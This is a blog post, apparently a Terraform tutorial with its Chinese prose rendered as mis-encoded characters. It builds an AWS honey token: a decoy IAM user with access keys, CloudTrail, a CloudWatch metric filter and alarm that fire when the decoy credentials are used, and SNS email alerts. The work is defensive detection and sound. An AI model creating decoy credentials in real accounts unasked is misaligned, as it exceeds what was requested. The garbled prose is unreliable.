<p>æœ¬æ¬¡å®éªŒçš„ç‰ˆæœ¬<code>Terraform v1.8.5</code>ï¼ŒåŒæ—¶æå‰ç¼“å­˜å¥½äº†AWS poviderã€‚ä¸‹é¢å¼€å§‹coding</p>
<h2 id="åˆ›å»ºawsç”¨æˆ·">åˆ›å»ºAWSç”¨æˆ·</h2>
<p>é¦–å…ˆç¼–å†™<code>povider.tf</code>ï¼Œé…ç½®å¥½<code>region</code>å’Œ<code>AK/SK</code></p>
<pre><code class="language-yaml">provider &quot;aws&quot; {
  region     = &quot;us-east-1&quot;
  access_key = &quot;&lt;aws_access_key&gt;&quot;
  secret_key = &quot;&lt;aws_secret_key&gt;&quot;
}
</code></pre>
<p><code>main.tf</code>åˆ›å»ºè¯±é¥µç”¨æˆ·ï¼ŒåŒæ—¶å¼€å¯å‡­è¯è®¿é—®</p>
<pre><code class="language-yaml"># è¯±é¥µç”¨æˆ· backup_admin
resource &quot;aws_iam_user&quot; &quot;backup_admin&quot; {
  name = &quot;backup-admin&quot;
}

resource &quot;aws_iam_access_key&quot; &quot;backup_admin_key&quot; {
  user = aws_iam_user.backup_admin.name
}
</code></pre>
<p><code>outputs.tf</code>å°†AK/SKè¾“å‡ºã€‚å› ä¸ºå¯†é’¥å±äºæ•æ„Ÿä¿¡æ¯ï¼Œæ— æ³•ç›´æ¥åœ¨æ§åˆ¶å°è¾“å‡ºï¼Œæ‰€ä»¥è¦ä¸ºå˜é‡è®¾ç½®<code>sensitive = true</code>ã€‚è‹¥è¦æŸ¥çœ‹ä½¿ç”¨å‘½ä»¤ï¼š<code>terraform output -json</code></p>
<pre><code class="language-yaml">output &quot;access_key_id&quot; {
  value     = aws_iam_access_key.backup_admin_key.id
  sensitive = true
}

output &quot;secret_access_key&quot; {
  value     = aws_iam_access_key.backup_admin_key.secret
  sensitive = true
}
</code></pre>
<p>ç¼–è¾‘å¥½ä¹‹åä¾æ¬¡è¾“å…¥å‘½ä»¤</p>
<pre><code class="language-yaml">terraform init
terraform plan
terraform apply
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720448356405-25ad5bf7-8edc-44e8-9b30-570329459b00.png" alt="image.png" loading="lazy"></figure>
<p>è¿™æ ·Terraformå°±è‡ªåŠ¨ä¸ºæˆ‘ä»¬åˆ›å»ºäº†è¿™ä¸ª<code>backup-admin</code>ç”¨æˆ·<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720505884086-59865913-dd1a-4b9b-a46c-dde8bc052656.png" alt="image.png" loading="lazy"></p>
<h2 id="åˆ›å»ºé…ç½®cloudtrail">åˆ›å»ºé…ç½®CloudTrail</h2>
<p>é¦–å…ˆå®šä¹‰å¥½å½“å‰AWSç”¨æˆ·çš„æ•°æ®æºï¼Œä¹‹ååˆ›å»ºçš„æ—¶å€™ä¼šç”¨åˆ°å…¶ä¸­çš„ä¿¡æ¯</p>
<pre><code class="language-yaml"># AWS å…ƒæ•°æ®
data &quot;aws_caller_identity&quot; &quot;current&quot; {}

data &quot;aws_partition&quot; &quot;current&quot; {}

data &quot;aws_region&quot; &quot;current&quot; {}
</code></pre>
<p>ç„¶åæ˜¯åˆ›å»ºCloudTrailçš„ä»£ç </p>
<pre><code class="language-yaml"># åˆ›å»º CloudTrail 
resource &quot;aws_cloudtrail&quot; &quot;cloudtrail_honey&quot; {
  name                          = &quot;cloudtrail_honey&quot;
  s3_bucket_name                = aws_s3_bucket.cloudtrail_bucket.id
  include_global_service_events = true
  is_multi_region_trail         = true

  depends_on = [aws_s3_bucket_policy.cloudtrail_bucket_policy]
}

# CloudTrail æ‰€ç”¨çš„ S3 é…ç½®
resource &quot;aws_s3_bucket&quot; &quot;cloudtrail_bucket&quot; {
  bucket        = &quot;cloudtrail-bucket-honey&quot;
  force_destroy = true
}

data &quot;aws_iam_policy_document&quot; &quot;cloudtrail_bucket_policy_document&quot; {
  statement {
    sid    = &quot;AWSCloudTrailAclCheck&quot;
    effect = &quot;Allow&quot;

    principals {
      type        = &quot;Service&quot;
      identifiers = [&quot;cloudtrail.amazonaws.com&quot;]
    }

    actions   = [&quot;s3:GetBucketAcl&quot;]
    resources = [aws_s3_bucket.cloudtrail_bucket.arn]
    condition {
      test     = &quot;StringEquals&quot;
      variable = &quot;aws:SourceArn&quot;
      values   = [&quot;arn:${data.aws_partition.current.partition}:cloudtrail:${data.aws_region.current.name}:${data.aws_caller_identity.current.account_id}:trail/cloudtrail_honey&quot;]
    }
  }

  statement {
    sid    = &quot;AWSCloudTrailWrite&quot;
    effect = &quot;Allow&quot;

    principals {
      type        = &quot;Service&quot;
      identifiers = [&quot;cloudtrail.amazonaws.com&quot;]
    }

    actions   = [&quot;s3:PutObject&quot;]
    resources = [&quot;${aws_s3_bucket.cloudtrail_bucket.arn}/AWSLogs/${data.aws_caller_identity.current.account_id}/*&quot;]

    condition {
      test     = &quot;StringEquals&quot;
      variable = &quot;s3:x-amz-acl&quot;
      values   = [&quot;bucket-owner-full-control&quot;]
    }
    condition {
      test     = &quot;StringEquals&quot;
      variable = &quot;aws:SourceArn&quot;
      values   = [&quot;arn:${data.aws_partition.current.partition}:cloudtrail:${data.aws_region.current.name}:${data.aws_caller_identity.current.account_id}:trail/cloudtrail_honey&quot;]
    }
  }
}

resource &quot;aws_s3_bucket_policy&quot; &quot;cloudtrail_bucket_policy&quot; {
  bucket = aws_s3_bucket.cloudtrail_bucket.id
  policy = data.aws_iam_policy_document.cloudtrail_bucket_policy_document.json
}
</code></pre>
<p>ä¸‹é¢ä¸€æ­¥ä¸€æ­¥è¯´æ˜ï¼Œé¦–å…ˆæ˜¯ <code>resource &quot;aws_cloudtrail&quot;</code> å—ã€‚è¿™é‡Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª<strong>AWS CloudTrailè¿½è¸ªå™¨</strong>å…¶ä¸­ï¼š</p>
<ul>
<li><code>name</code>æŒ‡å®šçš„æ˜¯CloudTrailè¿½è¸ªå™¨çš„åç§°ä¸º<code>cloudtrail_honey</code>ã€‚</li>
<li><code>s3_bucket_name</code>æŒ‡å®šå­˜å‚¨ CloudTrail æ—¥å¿—çš„ Amazon S3 æ¡¶çš„åç§°ã€‚è¿™é‡Œå¼•ç”¨äº†å¦ä¸€ä¸ª Terraform èµ„æº aws_s3_bucketï¼Œè¯¥èµ„æºçš„ ID è¢«ç”¨ä½œ S3 æ¡¶çš„åç§°ã€‚</li>
<li><code>include_global_service_events = true</code>è®¾ç½®å¯ç”¨äº†å…¨çƒæœåŠ¡äº‹ä»¶çš„è®°å½•ï¼Œå¦‚ AWS Identity and Access Management (IAM) æ“ä½œã€‚è¿™æ„å‘³ç€ä¸ä»…é™äºåœ°ç†åŒºåŸŸç‰¹å®šçš„æœåŠ¡ï¼Œå…¨çƒæœåŠ¡çš„äº‹ä»¶ä¹Ÿä¼šè¢«è®°å½•ã€‚</li>
<li><code>is_multi_region_trail = true</code>å¯ç”¨å¤šåŒºåŸŸè¿½è¸ªï¼Œç¡®ä¿æ‰€æœ‰ AWS åŒºåŸŸä¸­çš„äº‹ä»¶éƒ½è¢«è®°å½•ã€‚</li>
<li><code>depends_on = [aws_s3_bucket_policy.cloudtrail_bucket_policy]</code>è¿™æ˜¯ä¸€ä¸ª Terraform çš„éšå¼ä¾èµ–å…³ç³»å£°æ˜ï¼Œç”¨æ¥ç¡®ä¿åœ¨åˆ›å»º CloudTrail è¿½è¸ªå™¨ä¹‹å‰ï¼Œç›¸å…³çš„ S3 æ¡¶ç­–ç•¥å·²ç»è¢«åˆ›å»ºå’Œåº”ç”¨ã€‚</li>
</ul>
<pre><code class="language-yaml">resource &quot;aws_cloudtrail&quot; &quot;cloudtrail_honey&quot; {
  name                          = &quot;cloudtrail_honey&quot;
  s3_bucket_name                = aws_s3_bucket.cloudtrail_bucket.id
  include_global_service_events = true
  is_multi_region_trail         = true
  
  depends_on = [aws_s3_bucket_policy.cloudtrail_bucket_policy]
}
</code></pre>
<p>æ¥ä¸‹æ¥å®šä¹‰äº†ä¸€ä¸ªä¾›<code>cloudtrail_honey</code>ä½¿ç”¨çš„S3ä»¥åŠè¯¥S3çš„ç­–ç•¥ã€‚å…¶ä¸­</p>
<ul>
<li><strong>force_destroy</strong>ï¼šå½“è®¾ç½®ä¸º true æ—¶ï¼Œè¿™ä¸ªå±æ€§å…è®¸ Terraform åœ¨æ‰§è¡Œ terraform destroy å‘½ä»¤æ—¶åˆ é™¤å­˜å‚¨æ¡¶ï¼Œå³ä½¿å­˜å‚¨æ¡¶ä¸­è¿˜åŒ…å«æ–‡ä»¶ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿åœ¨æµ‹è¯•æˆ–ä¸´æ—¶éƒ¨ç½²çš„æƒ…å†µä¸‹ï¼Œèµ„æºå¯ä»¥è¢«å®Œå…¨æ¸…ç†ã€‚</li>
<li><strong>data &quot;aws_iam_policy_document&quot;</strong>ï¼šç­–ç•¥æ–‡æ¡£å°†è¦å®šä¹‰ AWS CloudTrail å†™å…¥æ—¥å¿—æ–‡ä»¶çš„æƒé™ã€‚</li>
<li><strong>policy</strong>ï¼šå°†å‰é¢å®šä¹‰çš„ IAM ç­–ç•¥æ–‡æ¡£ï¼ˆåºåˆ—åŒ–ä¸º JSON æ ¼å¼ï¼‰åº”ç”¨åˆ°æŒ‡å®šçš„å­˜å‚¨æ¡¶ã€‚è¿™æ ·ï¼Œå­˜å‚¨æ¡¶çš„è®¿é—®æƒé™å°±æ ¹æ®è¿™ä¸ªç­–ç•¥è¿›è¡Œäº†é…ç½®ã€‚</li>
</ul>
<pre><code class="language-yaml">resource &quot;aws_s3_bucket&quot; &quot;cloudtrail_bucket&quot; {
  bucket        = &quot;cloudtrail-bucket-honey&quot;
  force_destroy = true
}

data &quot;aws_iam_policy_document&quot; &quot;cloudtrail_bucket_policy_document&quot; {
  ......
}

resource &quot;aws_s3_bucket_policy&quot; &quot;cloudtrail_bucket_policy&quot; {
  bucket = aws_s3_bucket.cloudtrail_bucket.id
  policy = data.aws_iam_policy_document.cloudtrail_bucket_policy_document.json
}
</code></pre>
<p>S3çš„ç­–ç•¥æ–‡æ¡£ä¸»è¦æ˜¯è®© CloudTrail èƒ½å¤Ÿå°†æ—¥å¿—å­˜å‚¨åˆ°è¯¥ S3 ä¸­ã€‚è¿™ä¸ªç­–ç•¥åŒ…å«ä¸¤ä¸ªä¸»è¦çš„å£°æ˜ (statement)ï¼š</p>
<ul>
<li>ç¬¬ä¸€æ¡å£°æ˜: AWSCloudTrailAclCheck
<ul>
<li><strong>ä¸»ä½“ (Principals)</strong>ï¼šæŒ‡å®šæœåŠ¡ä¸»ä½“ä¸º cloudtrail.amazonaws.comï¼Œæ„å‘³ç€è¿™æ¡è§„åˆ™ä¸“ä¸º CloudTrail æœåŠ¡è®¾ç½®ã€‚</li>
<li><strong>åŠ¨ä½œ (Actions)</strong>ï¼šå…è®¸åŠ¨ä½œ s3:GetBucketAclï¼Œä½¿ CloudTrail èƒ½æ£€æŸ¥å­˜å‚¨æ¡¶çš„æƒé™è®¾ç½®ã€‚</li>
<li><strong>èµ„æº (Resources)</strong>ï¼šé™åˆ¶æƒé™åˆ°ç‰¹å®šçš„ S3 å­˜å‚¨æ¡¶ï¼ˆaws_s3_bucket.cloudtrail_bucket.arnï¼‰ã€‚</li>
<li><strong>æ¡ä»¶ (Condition)</strong>ï¼šç¡®ä¿åªæœ‰å½“è¯·æ±‚æ¥è‡ªç‰¹å®š CloudTrail è¿½è¸ªå™¨ (cloudtrail_honey) æ—¶ï¼Œæ‰å…è®¸è®¿é—®ã€‚é€šè¿‡åŒ¹é…è¯·æ±‚çš„æ¥æº ARN æ¥å¼ºåŒ–å®‰å…¨æªæ–½ã€‚</li>
</ul>
</li>
<li>ç¬¬äºŒæ¡å£°æ˜: AWSCloudTrailWrite
<ul>
<li><strong>ä¸»ä½“ (Principals)</strong>ï¼šåŒæ ·æŒ‡å®šæœåŠ¡ä¸»ä½“ä¸º cloudtrail.amazonaws.comã€‚</li>
<li><strong>åŠ¨ä½œ (Actions)</strong>ï¼šå…è®¸åŠ¨ä½œ s3:PutObjectï¼Œæˆæƒ CloudTrail å‘æŒ‡å®šè·¯å¾„å†™å…¥æ—¥å¿—æ–‡ä»¶ã€‚</li>
<li><strong>èµ„æº (Resources)</strong>ï¼šæŒ‡å®š CloudTrail å¯ä»¥å†™å…¥åˆ°çš„å…·ä½“å¯¹è±¡è·¯å¾„ï¼ŒåŒ…æ‹¬ AWS è´¦æˆ· ID å’Œå­˜å‚¨æ¡¶ ARN çš„ç»„åˆï¼Œç¡®ä¿æ—¥å¿—æ•°æ®çš„ç»„ç»‡å’Œéš”ç¦»ã€‚</li>
<li><strong>æ¡ä»¶ (Condition)</strong>ï¼š
<ul>
<li>s3:x-amz-acl ç¡®ä¿æ‰€æœ‰å†™å…¥çš„å¯¹è±¡è®¾ç½®ä¸º bucket-owner-full-controlï¼Œè¿™ä¸ºå­˜å‚¨æ¡¶æ‰€æœ‰è€…æä¾›äº†å¯¹æ—¥å¿—æ–‡ä»¶çš„å®Œå…¨æ§åˆ¶æƒã€‚</li>
<li>aws:SourceArn æ¡ä»¶åŒç¬¬ä¸€æ¡å£°æ˜ï¼Œä¿è¯åªæœ‰ç‰¹å®š CloudTrail è¿½è¸ªå™¨çš„è¯·æ±‚æ‰è¢«å…è®¸ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="language-yaml">data &quot;aws_iam_policy_document&quot; &quot;cloudtrail_bucket_policy_document&quot; {
  statement {
    sid    = &quot;AWSCloudTrailAclCheck&quot;
    effect = &quot;Allow&quot;

    principals {
      type        = &quot;Service&quot;
      identifiers = [&quot;cloudtrail.amazonaws.com&quot;]
    }

    actions   = [&quot;s3:GetBucketAcl&quot;]
    resources = [aws_s3_bucket.cloudtrail_bucket.arn]
    condition {
      test     = &quot;StringEquals&quot;
      variable = &quot;aws:SourceArn&quot;
      values   = [&quot;arn:${data.aws_partition.current.partition}:cloudtrail:${data.aws_region.current.name}:${data.aws_caller_identity.current.account_id}:trail/cloudtrail_honey&quot;]
    }
  }

  statement {
    sid    = &quot;AWSCloudTrailWrite&quot;
    effect = &quot;Allow&quot;

    principals {
      type        = &quot;Service&quot;
      identifiers = [&quot;cloudtrail.amazonaws.com&quot;]
    }

    actions   = [&quot;s3:PutObject&quot;]
    resources = [&quot;${aws_s3_bucket.cloudtrail_bucket.arn}/AWSLogs/${data.aws_caller_identity.current.account_id}/*&quot;]

    condition {
      test     = &quot;StringEquals&quot;
      variable = &quot;s3:x-amz-acl&quot;
      values   = [&quot;bucket-owner-full-control&quot;]
    }
    condition {
      test     = &quot;StringEquals&quot;
      variable = &quot;aws:SourceArn&quot;
      values   = [&quot;arn:${data.aws_partition.current.partition}:cloudtrail:${data.aws_region.current.name}:${data.aws_caller_identity.current.account_id}:trail/cloudtrail_honey&quot;]
    }
  }
}
</code></pre>
<p>è¿˜æ˜¯ç”¨ä¹‹å‰çš„å‘½ä»¤éƒ¨ç½²ï¼Œå®Œæˆä¹‹åå¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„ S3 å’Œ CloudTrailè¿½è¸ªå™¨<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720508544812-92692e4e-8d47-4783-968c-a0a86d891be4.png" alt="image.png" loading="lazy"><br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720508590128-fe79ebe2-5fe0-4433-82d1-e37fb2542849.png" alt="image.png" loading="lazy"></p>
<h2 id="åˆ›å»ºcloudwatch-logæ—¥å¿—ç»„">åˆ›å»ºCloudWatch Logæ—¥å¿—ç»„</h2>
<p>åˆ›å»ºCloudWatch Logæ—¥å¿—ç»„ä¹‹å‰ï¼Œè¿˜è¦è¦å‡†å¤‡ä¸€ä¸ªIAMè§’è‰²è®©CloudTrailå¯ä»¥å°†æ—¥å¿—æ¨é€åˆ°æ—¥å¿—ç»„ä¸­ã€‚</p>
<pre><code class="language-yaml"># ä¿®æ”¹ cloudtrailï¼Œæ·»åŠ å†™å…¥æ—¥å¿—ç»„çš„è§’è‰²å’Œæ—¥å¿—ç»„
resource &quot;aws_cloudtrail&quot; &quot;cloudtrail_honey&quot; {
  ......
  
  cloud_watch_logs_group_arn    = &quot;${aws_cloudwatch_log_group.cloudwatch_log_group_honey.arn}:*&quot;
  cloud_watch_logs_role_arn     = aws_iam_role.cloudtrail_logging_role.arn
    
  ......
}

# åˆ›å»ºCloudWatch Logæ—¥å¿—ç»„
resource &quot;aws_cloudwatch_log_group&quot; &quot;cloudwatch_log_group_honey&quot; {
  name = &quot;cloudwatch-log-group-honey&quot;
}

# åˆ›å»º CloudTrail æ¨é€æ—¥å¿—ç»„çš„è§’è‰²
resource &quot;aws_iam_role&quot; &quot;cloudtrail_logging_role&quot; {
  name               = &quot;cloudtrail-logging-role&quot;

  assume_role_policy = jsonencode({
    Version = &quot;2012-10-17&quot;
    Statement = [
      {
        Action = &quot;sts:AssumeRole&quot;
        Principal = {
          Service = &quot;cloudtrail.amazonaws.com&quot;
        }
        Effect = &quot;Allow&quot;
        Sid    = &quot;&quot;
      },
    ]
  })
}

resource &quot;aws_iam_role_policy&quot; &quot;cloudtrail_logging_role_policy&quot; {
  name      = &quot;cloudtrail-logging-role-policy&quot;
  role      = aws_iam_role.cloudtrail_logging_role.id

  policy    = jsonencode({
    Version = &quot;2012-10-17&quot;
    Statement = [
      {
        Action = [
          &quot;logs:CreateLogStream&quot;,
          &quot;logs:PutLogEvents&quot;
        ],
        Effect   = &quot;Allow&quot;,
        Resource = &quot;${aws_cloudwatch_log_group.cloudwatch_log_group_honey.arn}:log-stream:*&quot;
      },
    ]
  })
}
</code></pre>
<p>è¿™é‡Œå’Œå‰é¢æ§åˆ¶å°ä¸ä¸€æ ·çš„æ˜¯ï¼ŒIAMè§’è‰²æ·»åŠ çš„æ˜¯ä¸€ä¸ªå†…è”ç­–ç•¥è€Œä¸æ˜¯ä¸€ä¸ªæ‰˜ç®¡ç­–ç•¥ã€‚å…¶ä¸­å¯¹äº<strong>logs:CreateLogStream</strong>å’Œ<strong>logs:PutLogEvents</strong>æƒé™å¯¹åº”çš„<code>Resource</code>å†™æ³•ä¸º<code>${aws_cloudwatch_log_group.example.arn}:log-stream:*</code>ï¼Œè¿™ä¸ªè¡¨ç¤ºè¯¥æ—¥å¿—ç»„ä¸‹çš„æ‰€æœ‰æ—¥å¿—æµã€‚</p>
<p>é‡æ–°éƒ¨ç½²ï¼Œåœ¨CloudWatchçš„Live Tailä¸­æŸ¥çœ‹å®æ—¶çš„æ—¥å¿—<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720510175780-b7079c09-b6e2-468d-97d1-45f1fc2c199f.png" alt="image.png" loading="lazy"></p>
<h2 id="åˆ›å»ºå‘Šè­¦">åˆ›å»ºå‘Šè­¦</h2>
<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ª CloudWatch Logs çš„æŒ‡æ ‡è¿‡æ»¤å™¨ç”¨æ¥è¿‡æ»¤å‡ºè¯±é¥µè´¦æˆ·çš„è¡Œä¸ºï¼š</p>
<ul>
<li>Resource: aws_cloudwatch_log_metric_filter
<ul>
<li><code>log_group_name = aws_cloudwatch_log_group.cloudwatch_log_group_honey.name</code>æŒ‡å®šåº”ç”¨è¯¥è¿‡æ»¤å™¨çš„æ—¥å¿—ç»„ã€‚</li>
</ul>
</li>
<li>Metric Transformation
<ul>
<li><code>name = &quot;honeyToken&quot;</code>ï¼šè¿™æ˜¯åˆ›å»ºçš„ CloudWatch æŒ‡æ ‡çš„åç§°ï¼Œå½“æ—¥å¿—åŒ¹é…åˆ°ä¸Šè¿°æ¨¡å¼æ—¶ï¼Œæ­¤æŒ‡æ ‡ä¼šè¢«è§¦å‘æˆ–æ›´æ–°ã€‚</li>
<li><code>namespace = &quot;honeyAlarm&quot;</code>ï¼šæŒ‡æ ‡çš„å‘½åç©ºé—´ï¼Œå‘½åç©ºé—´ç”¨äºéš”ç¦»å„ä¸ªæŒ‡æ ‡é›†åˆï¼Œé˜²æ­¢å‘½åå†²çªã€‚</li>
<li><code>value = &quot;1&quot;</code>ï¼šæ¯å½“æ—¥å¿—åŒ¹é…åˆ°æ¨¡å¼æ—¶ï¼ŒæŒ‡æ ‡çš„å€¼å¢åŠ  1ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥é€šè¿‡è§‚å¯Ÿè¿™ä¸ªæŒ‡æ ‡çš„å˜åŒ–æ¥æ£€æµ‹åŒ¹é…åˆ°çš„æ—¥å¿—äº‹ä»¶çš„é¢‘ç‡ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="language-yaml">resource &quot;aws_cloudwatch_log_metric_filter&quot; &quot;honeyUser_filter&quot; {
  name           = &quot;honeyUser_metric_filter&quot;
  pattern        = &quot;{ $.userIdentity.type = \&quot;IAMUser\&quot; &amp;&amp; $.userIdentity.userName = \&quot;${aws_iam_user.backup_admin.name}\&quot; }&quot;
  log_group_name = aws_cloudwatch_log_group.cloudwatch_log_group_honey.name

  metric_transformation {
    name      = &quot;honeyToken&quot;
    namespace = &quot;honeyAlarm&quot;
    value     = &quot;1&quot;
  }
}
</code></pre>
<p>åˆ›å»ºå‘Šè­¦åŒæ—¶é…ç½®æ¥å—å‘Šè­¦çš„é‚®ç®±ï¼š</p>
<ul>
<li>Resource: aws_cloudwatch_metric_alarm
<ul>
<li><code>comparison_operator = &quot;GreaterThanOrEqualToThreshold&quot;</code>ï¼šè¿™ä¸ªæ¯”è¾ƒæ“ä½œç¬¦å®šä¹‰äº†è§¦å‘å‘Šè­¦çš„æ¡ä»¶ï¼Œè¡¨ç¤ºå½“ç›‘æ§çš„æŒ‡æ ‡å€¼å¤§äºæˆ–ç­‰äºè®¾ç½®çš„é˜ˆå€¼æ—¶ï¼Œå‘Šè­¦å°†è¢«è§¦å‘ã€‚</li>
<li><code>evaluation_periods = &quot;1&quot;</code>ï¼šè¡¨ç¤ºè¯„ä¼°æœŸæ•°ï¼Œå³ CloudWatch ä¼šè€ƒè™‘æœ€è¿‘çš„ä¸€ä¸ªæŒ‡å®šå‘¨æœŸï¼ˆåœ¨è¿™é‡Œæ˜¯60ç§’ï¼‰çš„æ•°æ®ç‚¹æ¥åˆ¤æ–­æ˜¯å¦è§¦å‘å‘Šè­¦ã€‚</li>
<li><code>metric_name/namespace</code>ï¼šå‘Šè­¦å°†ç›‘æ§ honeyAlarm å‘½åç©ºé—´ä¸‹çš„ metric_name æŒ‡æ ‡ï¼Œä¹Ÿå°±æ˜¯åˆšåˆšé…ç½®çš„å†…å®¹</li>
<li><code>period = 60</code>ï¼šæŒ‡å®šçš„å‘¨æœŸï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ï¼Œæ„å‘³ç€ CloudWatch ä¼šæ¯60ç§’æ”¶é›†ä¸€æ¬¡æŒ‡æ ‡æ•°æ®ï¼Œå¹¶ç”¨è¿™äº›æ•°æ®æ¥è¯„ä¼°æ˜¯å¦è§¦å‘å‘Šè­¦ã€‚</li>
<li><code>statistic** **= &quot;Sum&quot;</code>ï¼šç»Ÿè®¡æ–¹æ³•ï¼Œè¡¨ç¤ºåœ¨æ¯ä¸ªè¯„ä¼°å‘¨æœŸå†…ï¼ŒCloudWatch å°†å¯¹æ”¶é›†çš„æ•°æ®ç‚¹æ±‚å’Œæ¥è¿›è¡Œæ¯”è¾ƒåˆ¤æ–­ã€‚</li>
<li><code>threshold = 1</code>ï¼šå‘Šè­¦çš„è§¦å‘é˜ˆå€¼ï¼Œç»“åˆä¸Šè¿°çš„ comparison_operatorï¼Œæ„å‘³ç€å¦‚æœåœ¨ä¸€ä¸ªå‘¨æœŸå†…ï¼ˆ60ç§’ï¼‰æŒ‡æ ‡â€œhoneyTokenâ€çš„æ€»å’Œå¤§äºæˆ–ç­‰äº1ï¼Œåˆ™è§¦å‘å‘Šè­¦ã€‚</li>
<li><code>alarm_actions = [aws_sns_topic.alarm_topic.arn]</code>ï¼šå½“å‘Šè­¦çŠ¶æ€å˜ä¸º ALARM æ—¶ï¼Œå°†è§¦å‘çš„åŠ¨ä½œåˆ—è¡¨ã€‚åœ¨è¿™é‡Œï¼ŒæŒ‡å®šäº†ä¸€ä¸ª Amazon SNS ä¸»é¢˜çš„ ARNï¼Œå½“å‘Šè­¦è§¦å‘æ—¶ï¼Œå°†å‘è¿™ä¸ª SNS ä¸»é¢˜å‘é€é€šçŸ¥ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="language-yaml"># åˆ›å»ºå‘Šè­¦
resource &quot;aws_cloudwatch_metric_alarm&quot; &quot;backup_admin_alarm&quot; {
  alarm_name          = &quot;BackupAdminActivityAlarm&quot;
  comparison_operator = &quot;GreaterThanOrEqualToThreshold&quot;
  evaluation_periods  = &quot;1&quot;
  metric_name         = &quot;honeyToken&quot;
  namespace           = &quot;honeyAlarm&quot;
  period              = 60
  statistic           = &quot;Sum&quot;
  threshold           = 1
  alarm_description   = &quot;Alarm when backup-admin performs any activity.&quot;
  alarm_actions       = [aws_sns_topic.alarm_topic.arn]
}

# åˆ›å»ºSNSå¹¶é…ç½®é‚®ä»¶
resource &quot;aws_sns_topic&quot; &quot;alarm_topic&quot; {
  name = &quot;backup-admin-activity-topic&quot;
}

resource &quot;aws_sns_topic_subscription&quot; &quot;alarm_subscription&quot; {
  topic_arn = aws_sns_topic.alarm_topic.arn
  protocol  = &quot;email&quot;
  endpoint  = &quot;skky@blu3.com&quot;
}
</code></pre>
<p>applyä¹‹åå»é‚®ç®±é‡Œé¢ç¡®è®¤è®¢é˜…ä¾¿å¯æ¥å—å‘Šè­¦ä¿¡æ¯äº†ã€‚<code>terraform output -json</code>è¾“å‡ºè´¦æˆ·å‡­è¯ï¼Œç„¶ååœ¨CLIç™»å½•ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720513588154-04e69601-a07c-4680-a076-70a790598a6f.png" alt="image.png" loading="lazy"></p>
<p>é‚®ç®±æ”¶åˆ°å‘Šè­¦<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720513799153-03a6e07b-7ddb-4181-9a53-32791b56b9e4.png" alt="image.png" loading="lazy"></p>
<p>å®éªŒå®Œä¹‹åæ‰§è¡Œ<code>terraform destroy</code>æ¸…ç†æ‰åˆšåˆšåˆ›å»ºçš„æ‰€æœ‰èµ„æºã€‚éå¸¸æ–¹ä¾¿ğŸ˜<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720514314472-ec0e5420-83f0-4562-836d-732c9d3abcf9.png" alt="image.png" loading="lazy"></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>è¿™ä¸ªå›é¡¾è¿™ä¸ªæµç¨‹ï¼Œå…¶ä¸­CloudTrailè¿½è¸ªã€CloudWatch Logæ—¥å¿—ç»„ã€SNSä¸»é¢˜ç­‰èµ„æºæ˜¯ç›¸å¯¹æ¥è¯´ä¸ä¼šå˜çš„ã€‚å±äºè¯±é¥µè´¦æˆ·çš„éƒ¨åˆ†å°±åªæœ‰ä¸€ä¸ªIAMç”¨æˆ·å’Œå®ƒçš„CloudWatchå‘Šè­¦ã€‚æ‰€ä»¥æˆ‘ä»¬çš„tfä»£ç é€»è¾‘ä¸Šåº”è¯¥åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š</p>
<ul>
<li>ä¸€éƒ¨åˆ†æ˜¯åŸºç¡€èµ„æºçš„åˆ›å»ºï¼Œè¿™é‡Œåˆ›å»ºå®Œä¹‹åè¦æä¾›ä¸€ä¸ªCloudWatch Logæ—¥å¿—ç»„åç§°å’ŒSNSä¸»é¢˜ã€‚</li>
<li>å¦ä¸€ä¸ªéƒ¨åˆ†æ˜¯è¯±é¥µèµ„æºåˆ›å»ºï¼Œä¹Ÿå°±æ˜¯åˆ›å»ºä¸€ä¸ªIAMç”¨æˆ·å’Œå¹¶å®ƒçš„å‘Šè­¦ã€‚</li>
</ul>
<p>è¿™æ ·ä¹‹åå†åˆ›å»ºã€ä¿®æ”¹è¯±é¥µèµ„æºçš„æ—¶å€™å°±å¯ä»¥åªä¸“æ³¨äºè¯±é¥µèµ„æºçš„ä»£ç äº†<br>
<img src="https://skyblu3519.github.io/post-images/AWSHoneyToken/1720515078560-dc9ccd94-27f2-4825-9b42-0c19866abd77.png" alt="image.png" loading="lazy"></p>
<h1 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</h1>
<p><a href="https://pwnedlabs.io/labs/detect-malicious-activity-with-aws-honey-tokens">https://pwnedlabs.io/labs/detect-malicious-activity-with-aws-honey-tokens</a><br>
<a href="https://wiki.teamssix.com/CloudNative/Terraform/terraform-introductory.html">https://wiki.teamssix.com/CloudNative/Terraform/terraform-introductory.html</a><br>
<a href="https://lonegunmanb.github.io/introduction-terraform/3.4.%E8%BE%93%E5%87%BA%E5%80%BC.html">https://lonegunmanb.github.io/introduction-terraform/3.4.%E8%BE%93%E5%87%BA%E5%80%BC.html</a><br>
<a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail">https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail</a><br>
<a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudwatch_metric_alarm">https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudwatch_metric_alarm</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[AWS Account ID Reconnaissance]]></title>
        <id>https://skyblu3519.github.io/post/aws-account-id-reconnaissance/</id>
